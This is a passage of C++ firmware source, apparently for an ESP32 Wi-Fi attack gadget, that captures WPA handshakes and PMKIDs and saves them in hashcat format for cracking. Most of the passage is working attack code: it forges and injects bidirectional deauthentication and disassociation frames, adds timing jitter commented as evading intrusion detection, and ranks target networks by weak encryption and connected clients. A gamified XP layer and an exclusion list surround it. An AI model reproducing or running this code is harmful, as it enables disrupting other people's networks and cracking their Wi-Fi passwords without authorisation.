    // Offsets: 0-3=EAPOL hdr, 4=desc, 5-6=keyinfo, 7-8=keylen, 9-16=replay, 17-48=nonce, 49-64=iv, 65-72=rsc, 73-80=reserved, 81-96=MIC
    char micHex[33];
    for (int i = 0; i < 16; i++) {
        sprintf(micHex + i*2, "%02x", eapolFrame->data[81 + i]);
    }
    
    // MAC_AP (6 bytes as 12 hex chars)
    char macAP[13];
    sprintf(macAP, "%02x%02x%02x%02x%02x%02x",
            hs.bssid[0], hs.bssid[1], hs.bssid[2],
            hs.bssid[3], hs.bssid[4], hs.bssid[5]);
    
    // MAC_CLIENT (6 bytes as 12 hex chars)
    char macClient[13];
    sprintf(macClient, "%02x%02x%02x%02x%02x%02x",
            hs.station[0], hs.station[1], hs.station[2],
            hs.station[3], hs.station[4], hs.station[5]);
    
    // ESSID (hex-encoded)
    char essidHex[65];
    int ssidLen = strlen(hs.ssid);
    for (int i = 0; i < ssidLen && i < 32; i++) {
        sprintf(essidHex + i*2, "%02x", (uint8_t)hs.ssid[i]);
    }
    essidHex[ssidLen * 2] = 0;
    
    // ANonce from M1 or M3 (offset 17, 32 bytes)
    char nonceHex[65];
    for (int i = 0; i < 32; i++) {
        sprintf(nonceHex + i*2, "%02x", nonceFrame->data[17 + i]);
    }
    
    // Full EAPOL frame from M2 (hex-encoded)
    // The EAPOL frame length is in bytes 2-3 (big-endian) + 4 bytes header
    uint16_t eapolLen = (eapolFrame->data[2] << 8) | eapolFrame->data[3];
    eapolLen += 4;  // Add EAPOL header (version + type + length)
    if (eapolLen > eapolFrame->len) eapolLen = eapolFrame->len;
    
    // Allocate buffer for hex-encoded EAPOL (2 chars per byte)
    // Max EAPOL is 512 bytes = 1024 hex chars + null
    char* eapolHex = (char*)malloc(eapolLen * 2 + 1);
    if (!eapolHex) {
        f.close();
        Serial.printf("[OINK] OOM allocating EAPOL hex buffer\n");
        return false;
    }
    
    // Zero the MIC in EAPOL copy for hashcat (MIC at offset 81)
    // Work on a copy to avoid modifying original
    uint8_t eapolCopy[512];
    memcpy(eapolCopy, eapolFrame->data, eapolLen);
    memset(eapolCopy + 81, 0, 16);  // Zero MIC field
    
    for (int i = 0; i < eapolLen; i++) {
        sprintf(eapolHex + i*2, "%02x", eapolCopy[i]);
    }
    eapolHex[eapolLen * 2] = 0;
    
    // Write: WPA*02*MIC*MAC_AP*MAC_CLIENT*ESSID*ANONCE*EAPOL*MESSAGEPAIR
    f.printf("WPA*02*%s*%s*%s*%s*%s*%s*%02x\n",
             micHex, macAP, macClient, essidHex, nonceHex, eapolHex, msgPair);
    
    free(eapolHex);
    f.close();
    
    Serial.printf("[OINK] Handshake saved to %s (WPA*02, pair:%02x, hashcat -m 22000)\n", 
                  path, msgPair);
    return true;
}

bool OinkMode::saveAllPMKIDs() {
    if (!Config::isSDAvailable()) return false;
    
    // Ensure directory exists
    if (!SD.exists("/handshakes")) {
        SD.mkdir("/handshakes");
    }
    
    bool success = true;
    for (auto& p : pmkids) {
        if (!p.saved && p.ssid[0] != 0) {
            // Use BSSID-based filename in /handshakes/ (same as handshakes, but .22000 extension)
            char filename[64];
            snprintf(filename, sizeof(filename), "/handshakes/%02X%02X%02X%02X%02X%02X.22000",
                     p.bssid[0], p.bssid[1], p.bssid[2],
                     p.bssid[3], p.bssid[4], p.bssid[5]);
            
            if (savePMKID22000(p, filename)) {
                p.saved = true;
                Serial.printf("[OINK] PMKID saved: %s\n", p.ssid);
                SDLog::log("OINK", "PMKID saved: %s", p.ssid);
                
                // Save SSID to companion .txt file (same pattern as handshakes)
                char txtFilename[64];
                snprintf(txtFilename, sizeof(txtFilename), "/handshakes/%02X%02X%02X%02X%02X%02X_pmkid.txt",
                         p.bssid[0], p.bssid[1], p.bssid[2],
                         p.bssid[3], p.bssid[4], p.bssid[5]);
                File txtFile = SD.open(txtFilename, FILE_WRITE);
                if (txtFile) {
                    txtFile.println(p.ssid);
                    txtFile.close();
                }
            } else {
                success = false;
            }
        }
    }
    return success;
}

void OinkMode::sendDeauthFrame(const uint8_t* bssid, const uint8_t* station, uint8_t reason) {
    // Deauth frame structure
    uint8_t deauthPacket[26] = {
        0xC0, 0x00,  // Frame Control: Deauth
        0x00, 0x00,  // Duration
        // Address 1 (Destination)
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
        // Address 2 (Source/BSSID)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        // Address 3 (BSSID)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00,  // Sequence
        0x07, 0x00   // Reason code
    };
    
    memcpy(deauthPacket + 4, station, 6);
    memcpy(deauthPacket + 10, bssid, 6);
    memcpy(deauthPacket + 16, bssid, 6);
    deauthPacket[24] = reason;
    
    esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
}

void OinkMode::sendDeauthBurst(const uint8_t* bssid, const uint8_t* station, uint8_t count) {
    // Send burst of deauth frames for more effective disconnection
    // Random jitter between frames makes it harder for WIDS to detect pattern
    // Jitter is modified by buffs/debuffs (base 5ms, debuffed 7ms)
    uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    uint8_t jitterMax = SwineStats::getDeauthJitterMax();
    
    // Mark session as having deauthed (for Silent Witness achievement tracking)
    SessionStats& sess = const_cast<SessionStats&>(XP::getSession());
    sess.everDeauthed = true;
    
    for (uint8_t i = 0; i < count; i++) {
        // AP -> Client (pretend to be AP)
        sendDeauthFrame(bssid, station, 7);  // Class 3 frame from non-associated station
        
        // Random jitter 1-Nms between forward and reverse frames (buff-modified)
        delay(random(1, jitterMax + 1));
        
        // Client -> AP (pretend to be client) - bidirectional attack
        if (memcmp(station, broadcast, 6) != 0) {
            // Only if not broadcast - swap source/dest
            uint8_t reversePacket[26] = {
                0xC0, 0x00,  // Frame Control: Deauth
                0x00, 0x00,  // Duration
            };
            memcpy(reversePacket + 4, bssid, 6);     // To AP
            memcpy(reversePacket + 10, station, 6);  // From Client
            memcpy(reversePacket + 16, bssid, 6);    // BSSID
            reversePacket[22] = 0x00;
            reversePacket[23] = 0x00;
            reversePacket[24] = 1;  // Unspecified reason
            reversePacket[25] = 0x00;
            esp_wifi_80211_tx(WIFI_IF_STA, reversePacket, sizeof(reversePacket), false);
            
            // Jitter between iterations (buff-modified)
            if (i < count - 1) {
                delay(random(1, jitterMax + 1));
            }
        }
    }
}

void OinkMode::sendDisassocFrame(const uint8_t* bssid, const uint8_t* station, uint8_t reason) {
    // Disassociation frame - some clients respond better to this
    uint8_t disassocPacket[26] = {
        0xA0, 0x00,  // Frame Control: Disassoc (0xA0 instead of 0xC0)
        0x00, 0x00,  // Duration
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // DA
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // SA
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // BSSID
        0x00, 0x00,  // Sequence
        0x08, 0x00   // Reason code (Disassociated because station leaving)
    };
    
    memcpy(disassocPacket + 4, station, 6);
    memcpy(disassocPacket + 10, bssid, 6);
    memcpy(disassocPacket + 16, bssid, 6);
    disassocPacket[24] = reason;
    
    esp_wifi_80211_tx(WIFI_IF_STA, disassocPacket, sizeof(disassocPacket), false);
}

void OinkMode::trackClient(const uint8_t* bssid, const uint8_t* clientMac, int8_t rssi) {
    int netIdx = findNetwork(bssid);
    if (netIdx < 0) return;
    
    DetectedNetwork& net = networks[netIdx];
    
    // Check if client already tracked
    for (int i = 0; i < net.clientCount; i++) {
        if (memcmp(net.clients[i].mac, clientMac, 6) == 0) {
            net.clients[i].rssi = rssi;
            net.clients[i].lastSeen = millis();
            return;
        }
    }
    
    // Add new client if room
    if (net.clientCount < MAX_CLIENTS_PER_NETWORK) {
        memcpy(net.clients[net.clientCount].mac, clientMac, 6);
        net.clients[net.clientCount].rssi = rssi;
        net.clients[net.clientCount].lastSeen = millis();
        net.clientCount++;
        
        queueLog("[OINK] Client tracked: %02X:%02X:%02X:%02X:%02X:%02X -> %s",
                 clientMac[0], clientMac[1], clientMac[2],
                 clientMac[3], clientMac[4], clientMac[5],
                 net.ssid);
    }
}

bool OinkMode::detectPMF(const uint8_t* payload, uint16_t len) {
    // Parse RSN IE to detect PMF (Protected Management Frames)
    // RSN IE starts with tag 0x30
    uint16_t offset = 36;  // After fixed beacon fields
    
    while (offset + 2 < len) {
        uint8_t tag = payload[offset];
        uint8_t tagLen = payload[offset + 1];
        
        if (offset + 2 + tagLen > len) break;
        
        if (tag == 0x30 && tagLen >= 8) {  // RSN IE
            // RSN IE structure: version(2) + group cipher(4) + pairwise count(2) + ...
            // RSN capabilities are at the end, look for MFPC/MFPR bits
            uint16_t rsnOffset = offset + 2;
            uint16_t rsnEnd = rsnOffset + tagLen;
            
            // Skip version (2), group cipher (4)
            rsnOffset += 6;
            if (rsnOffset + 2 > rsnEnd) break;
            
            // Pairwise cipher count and suites
            uint16_t pairwiseCount = payload[rsnOffset] | (payload[rsnOffset + 1] << 8);
            rsnOffset += 2 + (pairwiseCount * 4);
            if (rsnOffset + 2 > rsnEnd) break;
            
            // AKM count and suites
            uint16_t akmCount = payload[rsnOffset] | (payload[rsnOffset + 1] << 8);
            rsnOffset += 2 + (akmCount * 4);
            if (rsnOffset + 2 > rsnEnd) break;
            
            // RSN Capabilities (2 bytes)
            uint16_t rsnCaps = payload[rsnOffset] | (payload[rsnOffset + 1] << 8);
            
            // IEEE 802.11-2016 standard:
            // Bit 6: MFPC (Management Frame Protection Capable)
            // Bit 7: MFPR (Management Frame Protection Required)
            bool mfpr = (rsnCaps >> 7) & 0x01;
            
            if (mfpr) {
                return true;  // PMF required - deauth won't work
            }
        }
        
        offset += 2 + tagLen;
    }
    
    return false;
}

int OinkMode::findNetwork(const uint8_t* bssid) {
    for (int i = 0; i < (int)networks.size(); i++) {
        if (memcmp(networks[i].bssid, bssid, 6) == 0) {
            return i;
        }
    }
    return -1;
}

bool OinkMode::hasHandshakeFor(const uint8_t* bssid) {
    for (const auto& hs : handshakes) {
        if (memcmp(hs.bssid, bssid, 6) == 0 && hs.isComplete()) {
            return true;
        }
    }
    return false;
}

void OinkMode::sortNetworksByPriority() {
    // Sort networks by attack priority:
    // 1. Has clients + no handshake + not PMF (highest priority)
    // 2. Weak auth (Open, WEP, WPA1) + no handshake
    // 3. WPA2 without PMF + no handshake
    // 4. Networks with handshake already (skip)
    // 5. PMF protected (can't attack)
    
    std::sort(networks.begin(), networks.end(), [](const DetectedNetwork& a, const DetectedNetwork& b) {
        // Calculate priority score (lower = higher priority)
        auto getPriority = [](const DetectedNetwork& net) -> int {
            // Already have handshake - lowest priority
            if (net.hasHandshake) return 100;
            // PMF protected - can't attack
            if (net.hasPMF) return 99;
            // Open networks - no handshake to capture
            if (net.authmode == WIFI_AUTH_OPEN) return 98;
            
            int priority = 50;  // Base
            
            // Has clients = much higher priority (deauth more likely to work)
            if (net.clientCount > 0) priority -= 30;
            
            // Auth mode priority (weaker = higher priority for cracking)
            switch (net.authmode) {
                case WIFI_AUTH_WEP: priority -= 15; break;   // Deprecated, easy to crack
                case WIFI_AUTH_WPA_PSK: priority -= 10; break;  // Weak
                case WIFI_AUTH_WPA_WPA2_PSK: priority -= 5; break;
                case WIFI_AUTH_WPA2_PSK: priority += 0; break;  // Standard
                case WIFI_AUTH_WPA3_PSK: priority += 10; break;  // Usually has PMF
                default: break;
            }
            
            // Fewer attack attempts = higher priority (try new ones first)
            priority += net.attackAttempts * 5;
            
            // Strong signal = higher priority (more reliable)
            if (net.rssi > -50) priority -= 5;
            else if (net.rssi > -70) priority -= 2;
            
            return priority;
        };
        
        return getPriority(a) < getPriority(b);
    });
}

int OinkMode::getNextTarget() {
    // Smart target selection with retry logic
    // First pass: networks with clients, no handshake, attackAttempts < 3
    for (int i = 0; i < (int)networks.size(); i++) {
        if (isExcluded(networks[i].bssid)) continue;  // BOAR BRO - skip
        if (networks[i].hasPMF) continue;
        if (networks[i].hasHandshake) continue;
        if (networks[i].authmode == WIFI_AUTH_OPEN) continue;  // Open = no handshake
        if (networks[i].clientCount > 0 && networks[i].attackAttempts < 3) {
            return i;
        }
    }
    
    // Second pass: any network without handshake, attackAttempts < 2
    for (int i = 0; i < (int)networks.size(); i++) {
        if (isExcluded(networks[i].bssid)) continue;  // BOAR BRO - skip
        if (networks[i].hasPMF) continue;
        if (networks[i].hasHandshake) continue;
        if (networks[i].authmode == WIFI_AUTH_OPEN) continue;
        if (networks[i].attackAttempts < 2) {
            return i;
        }
    }
    
    // Third pass: retry networks with clients even if attempted before
    for (int i = 0; i < (int)networks.size(); i++) {
        if (isExcluded(networks[i].bssid)) continue;  // BOAR BRO - skip
        if (networks[i].hasPMF) continue;
        if (networks[i].hasHandshake) continue;
        if (networks[i].authmode == WIFI_AUTH_OPEN) continue;
        if (networks[i].clientCount > 0) {
            return i;
        }
    }
    
    return -1;  // No suitable targets
}

// ============ BOAR BROS - Network Exclusion ============

uint64_t OinkMode::bssidToUint64(const uint8_t* bssid) {
    uint64_t result = 0;
    for (int i = 0; i < 6; i++) {
        result = (result << 8) | bssid[i];
    }
    return result;
}

bool OinkMode::isExcluded(const uint8_t* bssid) {
    return boarBros.count(bssidToUint64(bssid)) > 0;
}

uint16_t OinkMode::getExcludedCount() {
    return boarBros.size();
}

bool OinkMode::loadBoarBros() {
    boarBros.clear();
    
    if (!SD.exists(BOAR_BROS_FILE)) {
        Serial.println("[OINK] No BOAR BROS file, starting fresh");
        return true;
    }
    
    File f = SD.open(BOAR_BROS_FILE, FILE_READ);
    if (!f) {
        Serial.println("[OINK] Failed to open BOAR BROS file");
        return false;
    }
    
    while (f.available() && boarBros.size() < MAX_BOAR_BROS) {
        String line = f.readStringUntil('\n');
        line.trim();
        
        // Skip empty lines and comments
        if (line.length() == 0 || line.startsWith("#")) continue;
        
        // Format: AABBCCDDEEFF  Optional SSID comment
        // Parse first 12 hex chars as BSSID
        if (line.length() >= 12) {
            String hexBssid = line.substring(0, 12);
            hexBssid.toUpperCase();
            
            uint64_t bssid = 0;
            bool valid = true;
            for (int i = 0; i < 12; i++) {
                char c = hexBssid.charAt(i);
                uint8_t nibble;
                if (c >= '0' && c <= '9') nibble = c - '0';
                else if (c >= 'A' && c <= 'F') nibble = c - 'A' + 10;
                else { valid = false; break; }
                bssid = (bssid << 4) | nibble;
            }
            
            if (valid) {
                // Extract SSID from rest of line (after space)
                String ssid = "";
                if (line.length() > 13) {
                    ssid = line.substring(13);
                    ssid.trim();
                }
                boarBros[bssid] = ssid;
            }
        }
    }
    
    f.close();
    Serial.printf("[OINK] Loaded %d BOAR BROS\n", (int)boarBros.size());
    return true;
}

bool OinkMode::saveBoarBros() {
    // Delete existing file first to ensure clean overwrite (FILE_WRITE appends on ESP32)
    if (SD.exists(BOAR_BROS_FILE)) {
        SD.remove(BOAR_BROS_FILE);
    }
    
    File f = SD.open(BOAR_BROS_FILE, FILE_WRITE);
    if (!f) {
        Serial.println("[OINK] Failed to save BOAR BROS");
        return false;
    }
    
    f.println("# BOAR BROS - Networks to ignore");
    f.println("# Format: BSSID (12 hex chars) followed by optional SSID");
    
    for (const auto& entry : boarBros) {
        uint64_t bssid = entry.first;
        const String& ssid = entry.second;
        
        // Convert uint64 back to hex string
        char hex[13];
        snprintf(hex, sizeof(hex), "%02X%02X%02X%02X%02X%02X",
                 (uint8_t)((bssid >> 40) & 0xFF),
                 (uint8_t)((bssid >> 32) & 0xFF),
                 (uint8_t)((bssid >> 24) & 0xFF),
                 (uint8_t)((bssid >> 16) & 0xFF),
                 (uint8_t)((bssid >> 8) & 0xFF),
                 (uint8_t)(bssid & 0xFF));
        
        if (ssid.length() > 0) {
            f.printf("%s %s\n", hex, ssid.c_str());
        } else {
            f.println(hex);
        }
    }
    
    f.close();
    Serial.printf("[OINK] Saved %d BOAR BROS\n", (int)boarBros.size());
    return true;
}

void OinkMode::removeBoarBro(uint64_t bssid) {
    boarBros.erase(bssid);
    saveBoarBros();
    Serial.printf("[OINK] Removed BOAR BRO\n");
}

bool OinkMode::excludeNetwork(int index) {
    if (index < 0 || index >= (int)networks.size()) {
        Serial.printf("[OINK] excludeNetwork: invalid index %d (size=%d)\n", index, (int)networks.size());
        return false;
    }
    if (boarBros.size() >= MAX_BOAR_BROS) {
        Serial.println("[OINK] excludeNetwork: max bros reached");
        return false;
    }
    
    uint64_t bssid = bssidToUint64(networks[index].bssid);
    
    // Check if already excluded
    if (boarBros.count(bssid) > 0) {
        return false;
    }
    
    // Store BSSID with SSID (use NONAME BRO for hidden networks)
    String ssid = String(networks[index].ssid);
    if (ssid.length() == 0) ssid = "NONAME BRO";
    boarBros[bssid] = ssid;
    saveBoarBros();
    
    // Check if this is a mid-attack exclusion (mercy save) vs normal exclusion
    bool isMidAttack = (targetIndex == index && deauthing);
    
    // If this was the current attack target, abort the attack immediately
    if (targetIndex == index) {
        deauthing = false;
        channelHopping = true;
        targetIndex = -1;
        memset(targetBssid, 0, 6);
        autoState = AutoState::NEXT_TARGET;
        stateStartTime = millis();
        Serial.println("[OINK] Aborted attack on excluded network");
    }
    
    // Award XP for BOAR BROS action
    if (isMidAttack) {
        XP::addXP(XPEvent::BOAR_BRO_MERCY);  // +15 XP - mid-attack mercy!
    } else {
        XP::addXP(XPEvent::BOAR_BRO_ADDED);  // +5 XP - normal exclusion
    }
    
    Serial.printf("[OINK] Added BOAR BRO: %s (new mapSize=%d) mercy=%d\n", 
                  ssid.c_str(), (int)boarBros.size(), isMidAttack);
    return true;
}
